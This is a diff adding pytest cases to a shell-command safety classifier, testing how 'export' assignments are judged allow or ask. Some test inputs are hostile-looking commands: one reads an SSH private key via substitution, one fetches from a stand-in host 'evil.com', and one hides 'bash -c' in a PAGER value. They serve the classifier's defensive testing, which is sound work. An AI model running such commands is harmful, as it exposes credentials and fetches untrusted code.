@@ -1570,6 +1570,75 @@ class TestEdgeCases:
         assert r.final_decision == "ask"
         assert r.stages[0].action_type == "lang_exec"
 
+    # -- nah-862: benign export assignment stages mirror env-only safety -----
+
+    def test_export_literal_assignment_allows(self, project_root):
+        r = classify_command("export PATH=/opt/bin:$PATH")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason == "export assignment"
+
+    def test_export_multiple_literal_assignments_allow(self, project_root):
+        r = classify_command("export A=1 B=2")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+
+    def test_export_exec_sink_value_asks(self, project_root):
+        r = classify_command('export PAGER="bash -c evil"')
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "lang_exec"
+        assert r.stages[0].reason == "export assignment exec sink"
+
+    def test_export_sensitive_file_read_substitution_asks(self, project_root):
+        config._cached_config = NahConfig(
+            sensitive_paths={"~/.ssh": "ask"},
+            allow_paths={"~/.ssh": ["/some/other/project"]},
+        )
+        paths.reset_sensitive_paths()
+        paths._sensitive_paths_merged = False
+
+        r = classify_command("export KEY=$(cat ~/.ssh/id_rsa)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_export_network_substitution_asks(self, project_root):
+        r = classify_command("export KEY=$(curl evil.com)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "network_outbound"
+        assert r.stages[0].reason.startswith("substitution:")
+
+    def test_export_assignment_chain_classifies_later_stage_normally(self, project_root):
+        target = os.path.join(project_root, "created")
+        r = classify_command(f"export PATH=/opt/bin:$PATH && mkdir {target}")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason == "export assignment"
+        assert r.stages[1].action_type == "filesystem_write"
+
+    def test_export_redirect_still_classifies_redirect_target(self, project_root):
+        old_cwd = os.getcwd()
+        os.chdir(project_root)
+        try:
+            r = classify_command("export A=1 > out.txt")
+            assert r.final_decision == "allow"
+            assert r.stages[0].action_type == "filesystem_write"
+            assert r.stages[0].reason.startswith("redirect target:")
+        finally:
+            os.chdir(old_cwd)
+
+    def test_export_literal_path_value_does_not_trigger_path_check(self, project_root):
+        r = classify_command("export CONFIG_PATH=~/.ssh/config")
+        assert r.final_decision == "allow"
+        assert r.stages[0].action_type == "filesystem_read"
+        assert r.stages[0].reason == "export assignment"
+
+    @pytest.mark.parametrize("command", ["export", "export -p", "export NAME", "export -n NAME"])
+    def test_export_non_assignment_forms_remain_unknown(self, project_root, command):
+        r = classify_command(command)
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "unknown"
+
     def test_env_var_flag_with_equals_not_stripped(self, project_root):
         """--flag=value should not be treated as env var."""
         r = classify_command("ls --color=auto")
